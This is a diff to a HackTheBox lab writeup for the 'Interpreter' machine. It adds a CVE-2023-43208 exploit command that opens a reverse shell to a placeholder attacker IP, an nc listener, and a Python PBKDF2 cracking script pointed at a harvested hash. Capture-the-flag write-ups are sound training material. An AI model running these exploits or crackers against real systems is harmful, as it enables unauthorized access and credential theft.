@@ -1,4 +1,5 @@
 # 🏆 **Interpreter - HackTheBox Writeup**
+![Interpreter Banner](solved_machine_banner.PNG)
 ## **Machine:** Linux | **Difficulty:** Medium | **Name:** Interpreter
 ### **Achievement Link:** [https://labs.hackthebox.com/achievement/machine/847519/841](https://labs.hackthebox.com/achievement/machine/847519/841)
 ### **Pwned By:** Saurabh Tomar | **Date:** 23 Feb 2026 | **Points:** 45
@@ -83,6 +84,13 @@ python3 CVE-2023-43208.py -t https://interpreter.htb -c "id"
 uid=1001(mirth) gid=1001(mirth) groups=1001(mirth)
 ```
 
+```bash
+# Execute command for revershell
+pip install -r requirements.txt
+python3 CVE-2023-43208.py -u https://interpreter.htb -lh <YOUR_IP> -lp <PORT>
+
+# Before using upper command make sure you listner is on
+nc -lvnp <PORT>
 ---
 
 # 🗄️ **Database Enumeration & Credential Harvesting**
@@ -103,8 +111,6 @@ The `conf/mirth.properties` file contained database credentials:
 ```bash
 cat conf/mirth.properties
 ```
-
-![Database Credentials](final_output.PNG)
 
 **Credentials found:**
 ```properties
@@ -206,6 +212,43 @@ echo "62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb:bbff8b041
 # Crack with hashcat mode 10900 (PBKDF2-HMAC-SHA256)
 hashcat -m 10900 pbkdf2_hash.txt /usr/share/wordlists/rockyou.txt -w 3
 ```
+# Alternative way if upper command does not work
+
+# Crack the password using my python script
+
+```python
+import hashlib
+import base64
+import binascii
+
+def crack_pbkdf2_sha256(password_list_file, target_hash_hex, salt_hex, iterations):
+    # Convert hex to bytes
+    salt = binascii.unhexlify(salt_hex)
+    target = binascii.unhexlify(target_hash_hex)
+    
+    with open(password_list_file, 'r', encoding='latin-1') as f:
+        for password in f:
+            password = password.strip()
+            # PBKDF2-HMAC-SHA256 with 600k iterations
+            derived = hashlib.pbkdf2_hmac('sha256', 
+                                         password.encode('utf-8'), 
+                                         salt, 
+                                         iterations)
+            if derived == target:
+                print(f"[+] Password found: {password}")
+                return password
+            print(f"Trying: {password}", end='\r')
+    
+    print("Password not found")
+
+# Use karo
+salt_hex = "bbff8b0413949da7"
+hash_hex = "62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb"
+iterations = 600000
+
+crack_pbkdf2_sha256("/usr/share/wordlists/rockyou.txt", 
+                   hash_hex, salt_hex, iterations)
+```
 
 After some time, the password cracked:
 ```
@@ -239,7 +282,50 @@ uid=1000(sedric) gid=1000(sedric) groups=1000(sedric)
 ps -aux | grep root
 ```
 
-![Process Enumeration](interpreter_nmap_output.PNG)
+```bash
+root        1296  0.0  0.0      0     0 ?        I<   03:20   0:00 [scsi_tmf_32]
+root        1528  0.0  0.0      0     0 ?        S    03:20   0:00 [jbd2/sda1-8]
+root        1529  0.0  0.0      0     0 ?        I<   03:20   0:00 [ext4-rsv-conver]
+root        1570  0.0  0.9  65208 38024 ?        Rs   03:20   0:01 /lib/systemd/systemd-journald
+root        1597  0.0  0.1  28076  7444 ?        Ss   03:20   0:00 /lib/systemd/systemd-udevd
+systemd+    1829  0.0  0.1  90104  6676 ?        Ssl  03:20   0:01 /lib/systemd/systemd-timesyncd
+root        2184  0.0  0.0      0     0 ?        S    03:20   0:00 [irq/61-vmw_vmci]
+root        2197  0.0  0.0      0     0 ?        S    03:20   0:00 [irq/62-vmw_vmci]
+root        2222  0.0  0.0      0     0 ?        S    03:20   0:00 [irq/63-vmw_vmci]
+root        2275  0.0  0.0  86944  2736 ?        R<sl 03:20   0:00 /sbin/auditd
+root        2379  0.0  0.0      0     0 ?        S    03:20   0:00 [irq/16-vmwgfx]
+_laurel     2813  0.0  0.1   9468  5704 ?        S<   03:20   0:00 /usr/local/sbin/laurel --config /etc/laurel/config.toml
+root        2832  0.0  0.0      0     0 ?        I<   03:20   0:00 [cryptd]
+root        3052  0.0  0.0      0     0 ?        S    03:20   0:00 [audit_prune_tree]
+root        3157  0.0  0.0   6616  2680 ?        Ss   03:20   0:00 /usr/sbin/cron -f
+message+    3158  0.0  0.1   9248  4812 ?        Ss   03:20   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activa
+root        3163  0.0  0.2 221800 10808 ?        Ssl  03:20   0:00 /usr/sbin/rsyslogd -n -iNONE
+root        3176  0.0  0.1  17028  7816 ?        Ss   03:20   0:00 /lib/systemd/systemd-logind
+root        3195  0.0  0.1  16552  5856 ?        Ss   03:20   0:00 /sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev
+root        3248  0.0  0.0   5876  3596 ?        Ss   03:20   0:00 dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I
+root        3381  0.1  0.2 144736 11312 ?        Sl   03:20   0:25 /usr/sbin/vmtoolsd
+root        3450  0.0  0.2  40776 11324 ?        S    03:20   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
+root        3516  0.0  0.6 400212 25468 ?        Ssl  03:20   0:09 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
+mirth       3518  0.4  9.1 2882732 365720 ?      Ssl  03:20   1:31 /usr/lib/jvm/java-17-openjdk-amd64/bin/java -server -Xmx256m -Djava.awt.headless=true 
+root        3519  0.0  0.7  39872 31476 ?        Ss   03:20   0:03 /usr/bin/python3 /usr/local/bin/notif.py
+root        3534  0.0  0.0   5880  1004 tty1     Ss+  03:20   0:00 /sbin/agetty -o -p -- \u --noclear - linux
+root        3570  0.0  0.2  15452  8836 ?        Ss   03:20   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+mysql       3661  0.0  3.5 1415412 141132 ?      Ssl  03:20   0:03 /usr/sbin/mariadbd
+root        4113  0.0  0.0      0     0 ?        I    06:36   0:00 [kworker/1:0-events]
+root        4219  0.0  0.0      0     0 ?        I    08:12   0:00 [kworker/u4:2-flush-8:0]
+root        4243  0.0  0.0      0     0 ?        I    08:31   0:00 [kworker/0:0]
+root        4257  0.0  0.0      0     0 ?        I    08:42   0:00 [kworker/u4:1-ext4-rsv-conversion]
+root        4261  0.0  0.0      0     0 ?        I    08:50   0:00 [kworker/u4:0-flush-8:0]
+root        4263  0.0  0.0      0     0 ?        I    08:54   0:00 [kworker/u4:3-events_unbound]
+root        4265  0.1  0.2  17752 11164 ?        Ss   08:58   0:00 sshd: sedric [priv]
+sedric      4268  0.1  0.2  18904 10392 ?        Ss   08:58   0:00 /lib/systemd/systemd --user
+sedric      4269  0.0  0.0 103084  3044 ?        S    08:58   0:00 (sd-pam)
+root        4270  0.0  0.0      0     0 ?        I    08:58   0:00 [kworker/1:1]
+sedric      4280  0.0  0.1  18012  6916 ?        S    08:58   0:00 sshd: sedric@pts/0
+sedric      4281  0.0  0.1   9372  5748 pts/0    Ss   08:58   0:00 -bash
+sedric      4295  200  0.1  12308  5328 pts/0    R+   08:59   0:00 ps -aux
+```
+
 
 **Interesting process found:**
 ```
